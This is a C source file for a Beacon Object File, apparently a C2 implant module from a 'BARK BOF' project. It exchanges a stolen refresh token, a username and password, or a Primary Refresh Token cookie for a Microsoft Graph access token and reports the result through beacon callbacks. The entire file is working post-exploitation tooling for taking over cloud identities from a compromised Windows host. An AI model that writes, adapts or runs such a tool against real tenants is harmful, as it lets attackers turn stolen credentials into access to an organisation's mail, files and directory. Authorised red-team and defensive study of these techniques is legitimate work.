/*
 * get_access_token_for_msgraph.c — BARK BOF
 * Get-AccessTokenForMSGraph — Unified token acquisition for MS Graph
 *
 * Supports three grant types:
 *   rt  — Refresh Token grant
 *   up  — Username/Password (ROPC) grant
 *   prt — PRT Cookie flow
 *
 * Args : grantType, tenantId, credential, extra, clientId
 *
 *   grantType = "rt":  credential = refreshToken
 *   grantType = "up":  credential = username, extra = password
 *   grantType = "prt": credential = prtToken
 *   clientId is optional (defaults to 1b730954-...)
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

#define PATH_SZ 512
#define BODY_SZ 8192
#define ENC_SZ  4096

void go(char *args, int alen)
{
    datap  parser;
    char  *grantType  = NULL;
    char  *tenantId   = NULL;
    char  *credential = NULL;
    char  *extra      = NULL;
    char  *clientId   = NULL;

    BeaconDataParse(&parser, args, alen);
    grantType  = BeaconDataExtract(&parser, NULL);
    tenantId   = BeaconDataExtract(&parser, NULL);
    credential = BeaconDataExtract(&parser, NULL);
    extra      = BeaconDataExtract(&parser, NULL);
    clientId   = BeaconDataExtract(&parser, NULL);

    if (!grantType) grantType = "";
    if (!tenantId)  tenantId  = "";
    if (!credential) credential = "";
    if (!extra)     extra     = "";
    if (!clientId || MSVCRT$strlen(clientId) == 0)
        clientId = "1b730954-1685-4b74-9bfd-dac224a7b894";

    const char *resource = "https://graph.microsoft.com";

    if (MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage:\n"
            "  bark_get_tokens_for_msgraph rt  <tenantId> <refreshToken> [clientId]\n"
            "  bark_get_tokens_for_msgraph up  <tenantId> <username> <password> [clientId]\n"
            "  bark_get_tokens_for_msgraph prt <tenantId> <prtToken> [clientId]\n");
        return;
    }

    /* ----- Refresh Token ----- */
    if (MSVCRT$strcmp(grantType, "rt") == 0) {
        if (MSVCRT$strlen(credential) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] rt: <refreshToken> required\n");
            return;
        }
        static char pathBuf[PATH_SZ];
        static char bodyBuf[BODY_SZ];
        static char encRT[ENC_SZ];

        UrlEncode(credential, encRT, sizeof(encRT));
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/token", tenantId);
        LPWSTR wp = MbsToWcs(pathBuf);
        if (!wp) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

        MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
            "grant_type=refresh_token&client_id=%s&refresh_token=%s&resource=%s",
            clientId, encRT, resource);

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AccessTokenForMSGraph (RT)\n");
        BarkTokenPost(wp, bodyBuf);
        HFree(wp);
        return;
    }

    /* ----- Username / Password ----- */
    if (MSVCRT$strcmp(grantType, "up") == 0) {
        if (MSVCRT$strlen(credential) == 0 || MSVCRT$strlen(extra) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] up: <username> and <password> required\n");
            return;
        }
        static char pathBuf[PATH_SZ];
        static char bodyBuf[BODY_SZ];
        static char encPw[ENC_SZ];

        UrlEncode(extra, encPw, sizeof(encPw));
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/token", tenantId);
        LPWSTR wp = MbsToWcs(pathBuf);
        if (!wp) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

        MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
            "grant_type=password&client_id=%s&resource=%s&username=%s&password=%s&scope=openid",
            clientId, resource, credential, encPw);

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AccessTokenForMSGraph (UP) user=%s\n", credential);
        BarkTokenPost(wp, bodyBuf);
        HFree(wp);
        return;
    }

    /* ----- PRT Cookie ----- */
    if (MSVCRT$strcmp(grantType, "prt") == 0) {
        if (MSVCRT$strlen(credential) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] prt: <prtToken> required\n");
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AccessTokenForMSGraph (PRT)\n");
        BarkPRTCookieFlow(credential, resource, clientId, tenantId,
            "https://login.microsoftonline.com/common/oauth2/nativeclient");
        return;
    }

    BeaconPrintf(CALLBACK_ERROR, "[-] Unknown grantType '%s'. Use rt, up, or prt.\n", grantType);
}
